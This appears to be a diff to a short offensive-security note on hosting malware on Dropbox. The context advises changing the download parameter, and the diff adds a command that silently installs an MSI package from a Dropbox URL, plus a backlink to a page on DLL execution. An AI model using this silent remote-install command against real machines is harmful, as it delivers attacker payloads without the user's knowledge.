@@ -14,8 +14,14 @@ TODO: Fill this info
 
 Change the parameter `dl=1` to `dl=0` when hosting malware.
 
+```
+C:\> msiexec.exe /q /i <dropbox_URL>
+```
+
 ---
 ## References
+
+### Backlinks
 
 - [[DLL Execution]]
 
